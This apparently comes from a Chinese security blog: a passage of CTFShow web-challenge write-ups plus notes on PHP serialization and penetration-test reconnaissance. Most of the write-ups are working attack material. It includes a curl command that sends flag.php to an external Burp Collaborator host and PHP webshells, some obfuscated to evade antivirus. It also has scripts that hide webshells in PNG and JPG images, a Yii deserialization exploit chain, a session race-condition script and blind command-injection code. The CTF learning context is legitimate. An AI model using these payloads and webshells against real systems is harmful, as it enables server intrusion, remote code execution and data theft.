===\"admin\"\n\n后面有或，所以满足username==='admin'即可\n\n```\npayload:/admin/?code=admin&password=&username=admin\n```\n\n**133**\n\n[骚操作](https://blog.csdn.net/qq_46091464/article/details/109095382)\n\n```\n我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令\n**那为什么会这样？**\n因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数\n这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。\n而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是\n`$F`;\n$F变量内容就是我们最终执行的内容\n```\n\n使用一把burp自带的功能，Burp Collaborator，相较于DNSLog的好处就是可以带出POST信息，也可以携带Cookie\n\n还有curl命令的使用\n\n```\npayload:?F=`$F`;+curl -X POST -F xx=@flag.php  http://whhi73p89wxl0oghis6zcslnue04ot.burpcollaborator.net\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-09 15.18.07.png)\n\n**134**\n\nphp变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。\n\n```\npayload: ?_POST[key1]=36d&_POST[key2]=36d\n```\n\n**135**\n\n同之前或者直接mv改名\n\n```\npayload:?F=`$F`;+mv flag.php flag.txt;\n```\n\n**136**\n\nban了一堆命令，需要回显，使用Linux tee命令\n\nTee是Linux命令，用于显示程序的输出并将其复制到一个文件中。\n\n```\n命令|tee 输出文件\n```\n\n```\npayload:?c=tac /f149_15_h3r3|tee 1\n查看/1文件即可\n```\n\n**137**\n\ncall_user_func()来调用一个类里面的方法时，使用::如class::function\n\n```\npayload:\nPOST\nctfshow=ctfshow::getFlag\n```\n\n**138**\n\n调用还能传数组\n\n```\npayload:\nPOST\nctfshow[]=ctfshow&ctfshow[]=getFlag\n```\n\n**139**\n\n自动跳转我谢谢你啊\n\n我是真妹想到这玩意还能盲注\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"#获取小写字母与数字\nresult=\"\"\nkey=0\nfor j in range(1,45):\n\tprint(j)\n\tif key==1:\n\t\tbreak\n\tfor n in str:\n\t\tpayload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n\t\t#print(payload)\n\t\turl=\"http://13f3a3cd-22e6-4922-a7eb-431f62263a4f.challenge.ctf.show/?c=\"+payload\n\t\ttry:\n\t\t\trequests.get(url,timeout=(2.5,2.5))\t#time()第一个参数是响应时间，第二个是读取时间\n\t\texcept:\n\t\t    result=result+n\n\t\t    print(result)\n\t\t    break\n```\n\n**140**\n\nintval把字符串转成0，0=='字符串'结果为真\n\n找俩函数返回值为字符串就行\n\n```\npayload:\nPOST\nf1=md5&f2=phpinfo\n```\n\n**141**\n\n[绕过无字母数字方法](https://blog.csdn.net/miuzzx/article/details/109143413)\n\n使用取反法\n\n```\npayload：\n?v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&v2=1\n```\n\n**142**\n\n各种进制取零就行\n\n**143**\n"},{"title":"CTFShow文件上传","url":"/posts/2824.html","content":"\n**151**\n\n前端校验，直接绕过\n\n**152**\n\nContent/Type校验，直接绕过\n\n**153**\n\n文件后缀名校验，尝试使用php5,phtml等文件失败，康康wp学习新知识，查看响应 头发现中间件是nginx\n\n```\nnginx中和apache的.htacess有相同作用的文件是.user.ini，进一步拓展，php中的默认配置文件实为php.ini，而php.ini有四种配置模式\n\nPHP_INI_USER\t\t\t可以在user.ini中设定\nPHP_INI_PERDIR\t\t可以在php.ini,.htacess,httpd.conf中设定\nPHP_INI_SYSTEM\t\t可以在php.ini,httpd.conf中设定\nPHP_INI_ALL\t\t\t\t随意设定\n\n并且除了php.ini文件之外，php还会从当前目录到web根目录下逐级搜索ini文件，并且在世纪操作中除了PHP_INI_SYSTEM中的内容都可以通过.user.ini进行设定\n\n那么user.ini中实际有用的配置项有两个：\nauto_append_file \t//在php4.2.3及以前是PHP_INI_ALL里面的，后面变成了PHP_INI_PERDID\nauto_prepend_file\n这两项的功能是制定一个文件包含在要执行的文件之后/之前，类似帮助原始文件添加一个require(某文件)\n```\n\n所以最终我们需要的就是将木马上传后再上传.user.ini设置包含木马即可\n\n```\n//.user.ini\nauto_prepend_file = shell.png\n//shell.png\n@eval($_POST['kkk']);\n```\n\n**154**\n\n同上题，过滤了php，大小写绕过\n\n**155**\n\n严格过滤php，所以大小写过不去了，短标签绕过\n\n```PHP\n当php参数:short_open_tag = On时，php可以解析短标签内容\nphp中常见的四种标签的写法：\n<?php echo \"CTF\"; ?>\n<? echo \"CTF\"; ?>\t\t//short_open_tag = On\n<% echo \"CTF\"; %>\t\t//这种写法在php配置中默认关闭了的，所以不能输出一行3.如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。 \n<script language=”php”> echo \"CTF\"; </script>\n\n还有一种神奇写法以后会用到\n<?=(表达式)?>  等价于 <?php echo (表达式)?> //无限制  \n```\n\n**156**\n\n过滤了`[  ]`，可用`{  }`代替\n\n**157**\n\n过滤了分号和花括号，用上面的神奇写法直接执行`<?=(system('tac ../flag.???'))?>` \n\n**158**\n\n同上\n\n**159**\n\nsystem貌似没了，用`<?=nl ``../fl*``?>`\n\n**160**\n\n反引号都没了，只能尝试包含访问日志了\n\n```\n//shell.png\n<?include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n//空格都没给留就离谱\n//User-Agent\n<?php eval($_POST[1]);?>\n```\n\n**161**\n\n增加了对文件头的检测，其余同上\n\n**162**\n\n.和flag被过滤，session文件的竞争包含，隔壁文件包含有原因\n\n```php+HTML\n//.user.ini\nauto_prepend_file=/tmp/sess_kkk\n//1\n<?=include\"/tmp/sess_kkk\"?>\n//POC.html\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"链接\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n\n```\n\n**163**\n\n同上\n\n**164**\n\npng图片二次渲染\n\n```\n在php中包含需要渲染的代码时\n```\n\n直接用大佬脚本生成一张图片咯\n\n```PHP\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'kkk.png');  //要修改的图片的路径\n/*\n木马内容\n<?$_GET[0]($_POST[1]);?>\n*/\n?>\n```\n\n**165**\n\njpg图片二次渲染\n\n```php\n<?php\n    $miniPayload = \"<?php system('tac f*');?>\";\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\n用法  php exp.php a.png\n```\n\n**166**\n\nx-zip-compressed\n\n**167**\n\n提示中为httpd，肯定与apache有关，尝试解析漏洞，上传shell.php.xxx发现执行失败，尝试上传.htaccess\n\n```\n<FilesMatch \"png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n或者\nAddType application/x-httpd-php .png   //将.png后缀的文件解析 成php\n```\n\nOK\n\n**168**\n\n构造免杀木马\n\n```\n<?php\n$a = \"s#y#s#t#e#m\";\n$b = explode(\"#\",$a);\n$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];\n$c($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=substr('1s',1).'ystem';\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=strrev('metsys');\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=$_REQUEST['a'];\n$b=$_REQUEST['b'];\n$a($b);\n?>\n```\n\n\n\n\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFShow反序列化","url":"/posts/17329.html","content":"\n**254**\n\n```\npayload:?username=xxxxx&password=xxxxx\n```\n\n按照题中全等于直接构造即可\n\n**255-257**\n\n构造就行\n\n**258**\n\n过滤了`O:数字`的形式，在冒号后加+即可，URLdecode会自动解析成连接的\n\n**259**\n\n什么玩意跳过了\n\n```php\n//flag.php\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n\n//index.php\n<?php\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n```\n\n灰溜溜的回来看WP\n\n```\n如果调用一个没有定义的方法，那么就会使用类本身的call方法。由于给了个ssrf的代码，那么河里推断这是一个ssrf的原生类。\n```\n\n\n\n```PHP\n//PHP中原生类\nclass SoapClient {\n    /* Methods */\n    public __construct(?string $wsdl, array $options = [])\n    public __call(string $name, array $args): mixed\n    public __doRequest(\n        string $request,\n        string $location,\n        string $action,\n        int $version,\n        bool $oneWay = false\n    ): ?string\n    public __getCookies(): array\n    public __getFunctions(): ?array\n    public __getLastRequest(): ?string\n    public __getLastRequestHeaders(): ?string\n    public __getLastResponse(): ?string\n    public __getLastResponseHeaders(): ?string\n    public __getTypes(): ?array\n    public __setCookie(string $name, ?string $value = null): void\n    public __setLocation(?string $location = null): ?string\n    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool\n    public __soapCall(\n        string $name,\n        array $args,\n        ?array $options = null,\n        SoapHeader|array|null $inputHeaders = null,\n        array &$outputHeaders = null\n    ): mixed\n}\n//可以得知构造SoapClient的类对象的时候，需要有两个参数，字符串$wsdl和数组$options\n```\n\n```php\n在构造SoapClient类时，传入数组参数为：\narray('uri'=>'http://链接','location'=>'http://链接/文件','user_agent'=>'UA头')\n该类的__call方法可构造请求使其对指定URL发起POST请求\n所以构造该类代码如下\n\n\n<?php\n   $ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n   /*相当于构造出以下请求\n   User-Agent: ctfshow\n   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\n   Content-Type:application/x-www-form-urlencoded\n   Content-Length:13\n   \n   token=ctfshow\n   */\n   //由于Content-Length已经确定，所以后面该类自行构造的请求头失效\n   $s=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));\n   echo serialize($s);\n?>\n```\n\n**260**\n\n就输入那串字符就行\n\n**261**\n\n知识点：在7.4以上版本反序列化会绕过__wakeup()函数\n\n$this->code==0x36d是弱类型比较，0x36d又有没有打引号，所以代表数字877，构造时使用877开头的文件即可，最终构造内容如下\n\n```PHP\n<?php\n   class ctfshowvip{\n      public $username=\"877.php\";\n      public $password=\"<?php eval(\\$_POST['kkk']);?>\";\n  //这里记得转译，不然会让你传入kkk参数的\n      public $code;\n   }\n   $s=new ctfshowvip();\n   echo serialize($s);\n?>\n//无语Windows Defence把我文件删了😅\n```\n\n**262**\n\n简单轻松解法：\n\n在message.php中直接构造token=admin的类\n\n困难学习解法：\n\n**263**\n\n菜狗直接wp\n\n首先看\n\n```PHP\n//index.php\n$_SESSION['limti']>5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//明显limti写错了，所以这个代码永远执行的是$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//所以我们就可以控制session中的内容\n```\n\n知识点：session在存储时有两种形式，一种是php，一种是php_serialize\n\n```PHP\n<?php\n\tclass user{\n      public $name=\"jlan\";\n      public $pass=\"123456\";\n  }\n\t$s=new user();\n\t//php存储：user|O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}\n\t//php_serialize存储：a:1:{s:4:\"user\";O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}}\n?>\n```\n\n发现诡异的点了吗，在php存储中，｜是用来分离变量名和序列化后的内容的，所以只要我们构造出序列化好的内容并且在前面加｜就可以让程序进行自动反序列化\n\n继续查看inc/inc.php\n\n```PHP\n//inc/inc.php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function setStatus($s){\n        $this->status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"使用\".$this->password.\"登陆\".($this->status?\"成功\":\"失败\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n```\n\n其中包含`file_put_contents`函数可进行一句话木马的写入\n\n最终构造如下\n\n```PHP\nclass User{\n    public $username=\"1.php\";\n    public $password=\"<?php eval(\\$_POST['kkk']);phpinfo();?>\";\n    public $status='1';\n}\n$s=new User();\necho base64_encode('|'.serialize($s));\n```\n\n首先修改cookie访问主页，然后访问/check.php使得木马文件被写入，最后访问/log-1.php即可\n\n264\n\n**265**\n\n地址传参\n\n```PHP\n<?php\nclass ctfshowAdmin{\n   public $token;\n   public $password;\n   public function __construct(){\n       $this->token='a';\n       $this->password = &$this->token;\n\t}\n}\n$a=new ctfshowAdmin();\necho serialize($a);\n?>\n```\n\n**266**\n\n匹配抛出异常后__destrurt不触发，所以使用大小写绕过即可\n\n**267**\n\nyii框架的反序列化漏洞，利用的类\n\n```PHP\nyii\\db\\BatchQueryResult\n    public function __destruct()\n    {\n        // make sure cursor is closed\n        $this->reset();\n    }\n    public function reset()\n    {\n        if ($this->_dataReader !== null) {\n            $this->_dataReader->close();\n        }\n        $this->_dataReader = null;\n        $this->_batch = null;\n        $this->_value = null;\n        $this->_key = null;\n    }\n\n这里的$this->_dataReader内容可控，可以调用不存在close方法并且存在__call方法的类，全局搜索__call方法后，发现在\nyii\\vendor\\fzaninotto\\faker\\src\\Faker\\Generator.php\n    public function __call($method, $attributes)\n    {\n        return $this->format($method, $attributes);\n    }\n跟进format\n    public function format($formatter, $arguments = array())\n    {\n        return call_user_func_array($this->getFormatter($formatter), $arguments);\n    }\n跟进getFormatter\n    public function getFormatter($formatter)\n    {\n        if (isset($this->formatters[$formatter])) {\n            return $this->formatters[$formatter];\n        }\n        foreach ($this->providers as $provider) {\n            if (method_exists($provider, $formatter)) {\n                $this->formatters[$formatter] = array($provider, $formatter);\n                return $this->formatters[$formatter];//这里会返回传入的$formatter的值\n            }\n        }\n        throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));\n    }\n发现format方法中的call_user_func_array的第一个参数可控，想要利用进而查找调用了call_user_func函数的无参方法。发现了IndexAction.php中的run方法\nyii\\rest\\IndexAction.php\n    public function run()\n    {\n        if ($this->checkAccess) {\n            call_user_func($this->checkAccess, $this->id);\n        }\n\n        return $this->prepareDataProvider();\n    }\n在run方法中checkAccess和id都可控，利用链构造成功\n```\n\n利用链\n\n`yii\\db\\BatchQueryResult::__destruct() -> Faker\\Generator::__call() -> yii\\rest\\IndexAction::run()`\n\n```php\npoc\n<?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this->checkAccess = 'passthru';\n            $this->id = 'tac /flag';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            $this->formatters['close'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace yii\\db{\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n\n        public function __construct(){\n            $this->_dataReader = new Generator;\n        }\n    }\n}\nnamespace{\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\n}\n?>\n\n```\n\n","tags":["CTF","web"]},{"title":"PHP序列化","url":"/posts/28816.html","content":"\n序列化的概念：把一个对象转为字符串\n\n序列化的好处：\n\n1、有利于数据存储\n\n2、方便数据传递\n\n序列化后字符串的格式\n\n```\nPublic属性序列化后格式：成员名\nPrivate属性序列化后格式：%00类名%00成员名\nProtect属性序列化后格式：%00*%00成员名\n```\n\nO:对象类名长度:\"对象类名\":对象属性个数{属性名类型:属性名长度:\"属性名字\";属性类型:属性长度:\"属性内容\"}\n\n```\nPHP序列化与反序列化方法：\n1、__construct 当一个对象被创建时调用\n2、__destruct 当一个对象被销毁时调用\n3、__toString 当一个对象被当作一个字符串时使用\n4、__sleep 在对象被序列化之前运行\n5、__wakeup 在对象被反序列化之后调用\n```\n\n通过一道题来尝试一下吧：[网鼎杯 2020 青龙组]AreUSerialz\n\n题目代码：\n\n```PHP\n<?php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nclass FileHandler {\n    protected $op;\n    protected $filename;\n    protected $content;\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n}\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\nif(isset($_GET{'str'})) {\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n}\n```\n\n显然，如果我们想要拿到flag中的内容就需要进行读操作，操作的文件名是flag.php，所以我们尝试在本地构造一个对应的类并且将其序列化\n\n```PHP\n<?php\n\tclass FileHandler {\n    protected $op=2;\n    protected $filename='flag.php';\n    protected $content=1;\n\t}\n\t$s=new FileHandler();\n\techo serialize($s);\n?>\n```\n\n尝试生成的字符串作为payload发现失败，原因是在这个类里面每个变量都是保护属性，在序列化时会被序列化为**%00类名%00成员名**很明显%00是我们不需要的，所以需要将本地生成类中改为public属性\n\n```PHP\n<?php\n\tclass FileHandler {\n    public $op=2;\n    public $filename='flag.php';\n    public $content=1;\n\t}\n\t$s=new FileHandler();\n\techo serialize($s);\n?>\n```\n\n获取字符串后查看源码拿到flag\n","tags":["CTF","web"]},{"title":"CTFshow文件包含","url":"/posts/5550.html","content":"\n##### 78\n\n```\npayload:?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n无过滤直接伪协议读取flag\n\n##### 79\n\n```\npayload:?file=data://text/plain,<?=eval($_POST['cmd']);?>\nPOST\ncmd=system('cat flag.php');\n\npayload:?file=data://text/plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\n```\n\n过滤了php，可使用data协议，通过再传入一个参数来执行命令，也可base64解码出想执行的命令\n\n##### 80\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了data，可通过包含日志来执行命令\n\n##### 81\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了冒号，日志包含依然可行\n\n##### 82\n\n过滤了.，只能包含无后缀文件，在PHP中唯一能控制的无后缀文件就是session文件，所以尝试通过脚本竞争包含写入\n\n```\n原理：在我们自行添加PHPSSEID到网页中时，服务器会自动生成一个文件在/tmp/sess_name，文件名可控。文件内容通过PHP_ SESSION_UPLOAD_PROGRESS参数控制，该参数用于实时获取文件上传进度，会返回一个SESSION，并且该参数的内容将会被加入到sess_name文件中\n方法：一边构造POST文件传输请求，将PHP_SESSION_UPLOAD_PROGRESS包含到请求头中，一边包含/tmp/sess_name文件\n```\n\n##### 83-86\n\n```Python\n# 竞争万能脚本：\n# os.system('rm -rf /bin/Azuki')\n# 消灭Azuki保平安\nimport io\nimport requests\nimport threading\n\nsessID = 'flag'\nurl = 'http://193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show/'\n\n\ndef write(session):\n    while event.isSet():\n        f = io.BytesIO(b'a' * 1024 * 50)\n        response = session.post(\n            url,\n            cookies={'PHPSESSID': sessID},\n            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"cat *.php\");?>'},\n            files={'file': ('test.txt', f)}\n        )\n\n\ndef read(session):\n    while event.isSet():\n        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))\n        if 'test' in response.text:\n            print(response.text)\n            event.clear()\n        else:\n            print('[*]retrying...')\n\n\nif __name__ == '__main__':\n    event = threading.Event()\n    event.set()\n    with requests.session() as session:\n        for i in range(1, 30):\n            threading.Thread(target=write, args=(session,)).start()\n\n        for i in range(1, 30):\n            threading.Thread(target=read, args=(session,)).start()\n```\n\n**87**\n\n先贴一个[文章](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)\n\n对于php://filter的使用\n\n简单版本：使用rot13编解码绕过\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>经过rot13编码\n```\n\n复杂版本：使用base64编解码绕过\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>经过rot13编码\n```\n\n原理：在过滤器进行base64编解码时，会绕过所有不属于base64编码后的字符（+, / , 0~9,a~z,A~Z），比如题中的`<?php die(\"大佬别秀了\");?>`，过滤器识别到的字符只有phpdie，其余的字符被忽略，我们只需要在我们已经编好的base64文本加两个字母即可让phpdiexx被解析为base64编码后语句，与后面代码无关了\n\n**88**\n\n构造语句使得base64编码后只含数字和字母即可\n\n```\npayload:?file=data://text/plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7\n//<?php   eval($_POST[1]);\nPOST:\n1=system('tac f*');\n```\n\n","tags":["CTF","web"]},{"title":"小迪","url":"/posts/16397.html","content":"\n# 信息收集\n\n## Day 7 CDN绕过\n\n判断某网站是否使用CDN服务：使用多节点访问，查看返回IP是否相同\n\n#### CDN绕过：\n\n1、子域名查询：xxx.原始域名\n\n子域名查询：https://tool.chinaz.com/subdomain/\n\n2、邮件服务查询：使用邮件服务时大部分不会使用CDN，尝试收取来自该域名的邮件并查看原始邮件标头\n\n3、国外地址请求：针对国内网站，大部分不会开设国外CDN\n\n4、遗留文件，扫描全网：例如phpinfo，探针等，扫描全网使用\n\n5、黑暗搜索引擎搜索特定文件：Shodan，zoomeye，fofa\n\n搜哈希：以网页favicon.ico为例\n\n```python\nimport mmh3\nimport requests\n\nre=requesets.get('地址')\nfav=re.content.encode('base64')\nhas=mh3.hash(fav)\nprint 'http.favicon.hash:'+str(hash)\n```\n\n获得结果后到黑暗引擎中搜索特定内容\n\n6、DNS历史记录\n\n7、~~DDOS打爆~~\n\n8、第三方接口：get-site-ip.com，threatbook.cn\n\n<!--more-->\n\n## DAY 8 架构 搭建 WAF\n\n流程：首先查看是否能获得源码，如果是开源项目可直接去的源码\n\n而后查看服务器的操作系统，搭建平台，数据库类型\n\n进而查看各种站点\n\n最后绕过WAF\n\n攻击目标是否有APP：有的话首先查看是否通过web协议通信，是的话抓取数据包，没有\n\n{% pullquote mindmap mindmap-md %}\n- 信息搜集\n    - 有无web端\n        - 有CDN\n            - 找出真实服务器IP后攻击\n        - 无CDN\n            - 程序源码\n                - 未知CMS\n                - 开源CMS\n        - 服务器信息\n            - 操作系统\n            - 搭建平台\n            - 数据库类型\n        - 站点搭建\n            - 目录站点（从下往上打，只要打通整个根目录下所有站点全部被攻击）\n            - 端口站点\n            - 子域名站点\n            - 旁注站点——同服务器不同站点\n            - C端站点——同网段下不同服务器不同站点\n            - 类似域名站点等\n        - 防护应用WAF——通过脚本嗅探特征\n            - 大部分响应头有X-Powered-By: WAF\n            - 安全狗\n            - 宝塔\n            - 云盾\n            - 安骑士\n    - 有无APP\n        - 走web协议\n            - 抓取数据包走web攻击\n        - 非web协议\n            - 尝试提取\n            - 反编译逆向\n    - 有无其他\n        - 资产信息\n            - 以上各种平台信息\n            - whois备案\n            - github等监控\n        - 第三方应用\n            - 数据库应用\n                - mysql\n                - mssql\n                - oracle\n            - 管理平台\n                - weblogic\n                - phpmyadmin\n            - 第三方应用\n                - vsftpd\n                - nexus\n                - git\n        - 各种服务接口\n            - 存储服务\n            - 支付服务\n            - 内部服务\n        - 微信公众号等位置找到更多的应用\n            - 涉及web\n            - 涉及APP\n            - 涉及其他\n        - 内部群或内部应用等（社工）\n            - QQ或微信群\n            - 工作群\n            - 